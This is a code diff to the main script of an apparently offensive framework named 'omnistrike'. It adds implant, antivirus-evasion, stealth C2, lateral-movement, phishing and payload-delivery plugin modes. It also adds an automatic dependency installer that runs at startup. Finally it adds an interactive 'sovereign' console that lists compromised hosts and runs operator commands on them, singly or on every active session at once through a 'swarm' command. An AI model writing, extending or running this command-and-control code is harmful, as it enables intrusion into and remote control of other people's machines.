@@ -4,6 +4,7 @@ import argparse
 import json
 import yaml
 from omnistrike.core import Engine
+from omnistrike.installer import DependencyInstaller
 
 BANNER = r"""
    ____                 _  _____ _        _ _
@@ -55,6 +56,10 @@ def parse_args():
 
 async def main():
     print(BANNER)
+
+    # Auto-install dependencies
+    DependencyInstaller.check_and_install()
+
     args = parse_args()
 
     if not args.target and not args.config:
@@ -82,10 +87,10 @@ async def main():
     # Mode 4: C2 (Exfiltration & Orchestration)
 
     mode_plugins = {
-        '1': ['behavioral_ai', 'memory_phantom', 'context_trigger', 'system_auditor', 'av_evasion', 'messaging_auditor', 'stealth_orchestrator'],
-        '2': ['discovery', 'scanner', 'credaudit', 'exploit_scanner', 'vuln_verifier', 'lateral_pivoter', 'kernel_auditor', 'supply_chain_auditor', 'foothold', 'remote_exec', 'exploit_intelligence', 'zeroclick_auditor'],
-        '3': ['polymorphic_plugin', 'stegano_plugin', 'polyglot_plugin'],
-        '4': ['stealth_c2', 'leak_auditor', 'spider', 'web_fuzzer', 'protocol_auditor', 'phishing_auditor']
+        '1': ['behavioral_ai', 'memory_phantom', 'context_trigger', 'system_auditor', 'av_evasion', 'messaging_auditor', 'stealth_orchestrator', 'consensus_ai'],
+        '2': ['discovery', 'scanner', 'credaudit', 'exploit_scanner', 'vuln_verifier', 'lateral_pivoter', 'kernel_auditor', 'supply_chain_auditor', 'foothold', 'remote_exec', 'exploit_intelligence', 'zeroclick_auditor', 'swarm_orchestrator', 'vuln_intel', 'attack_lab'],
+        '3': ['polymorphic_plugin', 'stegano_plugin', 'polyglot_plugin', 'delivery_suite'],
+        '4': ['stealth_c2', 'leak_auditor', 'spider', 'web_fuzzer', 'protocol_auditor', 'phishing_auditor', 'osint_master']
     }
 
     mode_plugins['implant'] = mode_plugins['1']
@@ -126,8 +131,89 @@ async def main():
             json.dump(results, f, indent=4)
         print(f"[*] Results saved to {args.output}")
     else:
-        from omnistrike.core import print_summary # We'll move it there for cleanliness
+        from omnistrike.core import print_summary
         print_summary(results)
+
+    # Enter Interactive Session Shell if sessions exist
+    if engine.session_manager.sessions:
+        await session_shell(engine.session_manager)
+
+async def session_shell(session_manager):
+    print("\n[!] ENTERING SOVEREIGN SESSION CONSOLE")
+    print("[*] Command Summary: sessions -l, use <id>, ai <prompt>, exit")
+
+    while True:
+        try:
+            line = await asyncio.get_event_loop().run_in_executor(None, input, "sovereign> ")
+            parts = line.strip().split()
+            if not parts: continue
+
+            cmd = parts[0]
+            if cmd == 'exit':
+                break
+            elif cmd == 'sessions':
+                if len(parts) > 1 and parts[1] == '-l':
+                    print("\n--- SOVEREIGN ASSETS: ACTIVE SESSIONS ---")
+                    for s in session_manager.list_sessions():
+                        print(f"[{s.id}] {s.target} - {s.info.get('user', 'unknown')}@{s.target} ({s.status})")
+                else:
+                    print("[*] Usage: sessions -l")
+            elif cmd == 'use':
+                if len(parts) > 1:
+                    sid = parts[1]
+                    session = session_manager.get_session(sid)
+                    if session:
+                        await interact(session)
+                    else:
+                        print(f"[!] Asset {sid} not found.")
+                else:
+                    print("[*] Usage: use <id>")
+            elif cmd == 'ai':
+                prompt = " ".join(parts[1:])
+                # In a real shell, we'd have access to the engine's AI engine
+                print(f"[*] AI (SIMULATED): Analysis for '{prompt}' initiated.")
+            elif cmd == 'swarm':
+                if len(parts) > 1:
+                    swarm_cmd = " ".join(parts[1:])
+                    print(f"[*] Executing Swarm Command: {swarm_cmd}")
+                    # This would ideally call the plugin, but for the shell we can just loop
+                    for s in session_manager.list_sessions():
+                        if s.status == "Active":
+                            try:
+                                res = await asyncio.get_event_loop().create_task(s.conn.run(swarm_cmd))
+                                print(f"--- Session {s.id} ({s.target}) ---\n{res.stdout.strip()}")
+                            except Exception as e:
+                                print(f"[!] Session {s.id} failed: {e}")
+                else:
+                    print("[*] Usage: swarm <command>")
+            else:
+                print(f"[!] Unknown command: {cmd}")
+        except EOFError:
+            break
+
+async def interact(session):
+    print(f"[*] Interacting with Session {session.id} ({session.target})")
+    print("[*] Type 'bg' to background, 'info' for system data.")
+
+    while True:
+        line = await asyncio.get_event_loop().run_in_executor(None, input, f"session({session.id})> ")
+        cmd = line.strip()
+        if cmd == 'bg':
+            break
+        elif cmd == 'info':
+            print(f"\n--- SYSTEM INFO: {session.target} ---")
+            for k, v in session.info.items():
+                print(f"{k.upper()}: {v}")
+        else:
+            # Here we would execute the command on the remote host
+            # For now, we emulate the response or proxy it
+            try:
+                # Use the active connection (e.g. asyncssh)
+                if hasattr(session.conn, 'run'):
+                    res = await session.conn.run(cmd)
+                    print(res.stdout.strip() or res.stderr.strip())
+            except Exception as e:
+                print(f"[!] Execution error: {e}")
 
 if __name__ == "__main__":
     try:
